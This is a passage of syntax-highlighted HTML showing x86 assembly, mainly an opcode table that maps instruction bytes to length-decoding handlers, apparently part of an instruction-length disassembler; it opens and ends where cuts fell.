    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B0h</span><span class="sc0">
    </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

</span><span class="sc5">S9</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">
    
</span><span class="sc1">;----------------------------------------------</span><span class="sc0">
</span><span class="sc5">OpTbl</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">32</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc0"> </span><span class="sc1">; ADD,ADC,AND,XOR</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc0"> </span><span class="sc1">; OR ,SBB,SUB,CMP</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">1Ah</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc4">,</span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc2">3Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc4">,</span><span class="sc2">1Bh</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">17</span><span class="sc0">              </span><span class="sc1">; J??,Jmp Short</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">7Ah</span><span class="sc4">,</span><span class="sc2">7Bh</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc4">,</span><span class="sc2">7Dh</span><span class="sc4">,</span><span class="sc2">7Eh</span><span class="sc4">,</span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EBh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; Mov Reg8,im8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc2">0B3h</span><span class="sc4">,</span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc2">0B7h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; Mov Reg16,im16</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">0B9h</span><span class="sc4">,</span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc2">0BCh</span><span class="sc4">,</span><span class="sc2">0BDh</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">               </span><span class="sc1">; AND,ADC.... AL,im8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc2">1Dh</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0"> </span><span class="sc1">; AND,ADC.... (E)AX,im16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; INC/DEC Reg16(32)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc4">,</span><span class="sc2">4Dh</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc4">,</span><span class="sc2">95h</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc0"> </span><span class="sc1">; NOP,XCHG (E)AX,Reg16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">              </span><span class="sc1">; Push/Pop Reg16(32)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">51h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">5Ah</span><span class="sc4">,</span><span class="sc2">5Bh</span><span class="sc4">,</span><span class="sc2">5Ch</span><span class="sc4">,</span><span class="sc2">5Dh</span><span class="sc4">,</span><span class="sc2">5Eh</span><span class="sc4">,</span><span class="sc2">5Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">60h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc0">             </span><span class="sc1">; Pusha/Popa</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">62h</span><span class="sc0">             </span><span class="sc1">; Bound</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">66h</span><span class="sc0">             </span><span class="sc1">; Extended Size</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetSize16</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">67h</span><span class="sc0">             </span><span class="sc1">; Xtended data</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">XData</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">             </span><span class="sc1">; SegFS/GS</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Repzz</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">26h</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Repzz</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc2">0A1h</span><span class="sc4">,</span><span class="sc2">0A2h</span><span class="sc4">,</span><span class="sc2">0A3h</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc0">   </span><span class="sc1">; MOV (E)AX,mem16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5addr</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">; ???SB</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0A4h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc4">,</span><span class="sc2">0A6h</span><span class="sc4">,</span><span class="sc2">0A7h</span><span class="sc4">,</span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc2">0AEh</span><span class="sc4">,</span><span class="sc2">0AFh</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc0">           </span><span class="sc1">; RETN/RETF</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D4h</span><span class="sc4">,</span><span class="sc2">0D5h</span><span class="sc4">,</span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc2">0CCh</span><span class="sc0">     </span><span class="sc1">; AAM/AAD,etc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C2h</span><span class="sc4">,</span><span class="sc2">0CAh</span><span class="sc0">           </span><span class="sc1">; RETF/RETN im16</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc2">0C5h</span><span class="sc0">           </span><span class="sc1">; LES/LDS</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C6h</span><span class="sc0">                </span><span class="sc1">; MOV mem,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C7h</span><span class="sc0">                </span><span class="sc1">; MOV mem,imm16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex4</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">           </span><span class="sc1">; SHL/ROL/ROR ...,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc2">0D3h</span><span class="sc0">     </span><span class="sc1">; SHL/.... ,1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">          </span><span class="sc1">; SHL/.... ,CL</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">         </span><span class="sc1">; MOV r/m,im16,etc</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Ch</span><span class="sc4">,</span><span class="sc2">8Eh</span><span class="sc0">             </span><span class="sc1">; MOV r/m,seg</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">          </span><span class="sc1">; MOV seg,r/m</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">8Fh</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">             </span><span class="sc1">; POP r/m,LEA reg,r/m</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">68h</span><span class="sc0">             </span><span class="sc1">; PUSH im16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Ah</span><span class="sc0">             </span><span class="sc1">; PUSH im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">69h</span><span class="sc0">             </span><span class="sc1">; imul r/m,im16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex4</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Bh</span><span class="sc0">             </span><span class="sc1">; imul r/m,im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6Ch</span><span class="sc4">,</span><span class="sc2">6Dh</span><span class="sc4">,</span><span class="sc2">6Eh</span><span class="sc4">,</span><span class="sc2">6Fh</span><span class="sc0">         </span><span class="sc1">; insb/insw/outsb/outsw</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">99h</span><span class="sc4">,</span><span class="sc2">9Bh</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc4">,</span><span class="sc2">9Dh</span><span class="sc4">,</span><span class="sc2">9Eh</span><span class="sc4">,</span><span class="sc2">9Fh</span><span class="sc0"> </span><span class="sc1">; cbw/.../lahf/...</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc0">                </span><span class="sc1">; int im8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C9h</span><span class="sc4">,</span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc2">0CFh</span><span class="sc0">          </span><span class="sc1">; leave/into/iret</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0C8h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return4</span><span class="sc0">          </span><span class="sc1">; Enter im16,im8</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">82h</span><span class="sc4">,</span><span class="sc2">83h</span><span class="sc0">         </span><span class="sc1">; ArOp</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">84h</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc0">         </span><span class="sc1">; TEST/XCHG r8(16)(32),r/m</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex</span><span class="sc0">
    
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">81h</span><span class="sc0">             </span><span class="sc1">; ArOp r/m,r16(32)</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Complex4</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc2">0E1h</span><span class="sc4">,</span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc2">0E3h</span><span class="sc0">     </span><span class="sc1">; Loop??,jcxz</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E4h</span><span class="sc4">,</span><span class="sc2">0E5h</span><span class="sc4">,</span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc2">0E7h</span><span class="sc0">     </span><span class="sc1">; IN/OUT AL(AX)(EAX),port8</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">           </span><span class="sc1">; Jmp/Call Near</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return3or5</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">                </span><span class="sc1">; Jmp Far</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return7</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc2">0EFh</span><span class="sc0">     </span><span class="sc1">; IN/OUT AL(AX)(EAX),DX</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc2">0F4h</span><span class="sc4">,</span><span class="sc2">0F5h</span><span class="sc0">          </span><span class="sc1">; Lock,Halt,CMC</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F2h</span><span class="sc4">,</span><span class="sc2">0F3h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Repzz</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc0">   </span><span class="sc1">; STC/...</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Return1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F6h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Grp1</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0F7h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Grp2</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
